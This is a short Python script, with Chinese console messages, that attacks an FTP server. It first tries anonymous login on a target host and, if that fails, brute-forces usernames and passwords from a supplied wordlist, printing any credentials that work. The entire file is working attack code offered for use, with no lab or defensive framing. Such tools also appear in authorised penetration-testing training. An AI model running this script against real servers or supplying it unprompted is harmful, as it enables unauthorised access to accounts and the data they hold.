import ftplib
import optparse

def anonymous_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login()
        print('\n[*] ' + str(hostname) + ' FTP 匿名登录成功')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + ' FTP 匿名登录失败')
        return False

def brute_force(hostname, passwd_file):
    with open(passwd_file, 'r') as f:
        for line in f:
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                print('\n[*] ' + str(hostname) + ' FTP 登录成功 ' + username + '/' + password)
                ftp.quit()
                return (username, password)
            except Exception as e:
                pass
    print('\n[-] 不能暴破ftp')
    return (None, None)


def main():
    parser = optparse.OptionParser('usage: [-h] ... [-t] host [-l] passwordfile')
    parser.add_option('-t', dest='hostname', type='string', help='specify target host')
    parser.add_option('-l', dest='passwdfile', type='string', help='specify password file')

    options, args = parser.parse_args()

    password_file = options.passwdfile
    host = options.hostname

    if password_file is not None and host is not None:
        # ftp anonymous login check
        login_anonymous = anonymous_login(host)
        if login_anonymous == True:
            print('匿名登录成功')

        # ftp credential brute force
        else:
            username, password = brute_force(host, password_file)
            if username == None:
                print('[-] 登录失败')
            else:
                print('\n[*] 登录成功 ' + username + '/' + password + '\n')

    elif host is None:
        print('[-] 目标无效，尝试使用-t指定目标ftp服务器')
    elif password_file is None:
        print('[-] 请添加密码字典，-l指定密码字典')


if __name__ == '__main__':
    main()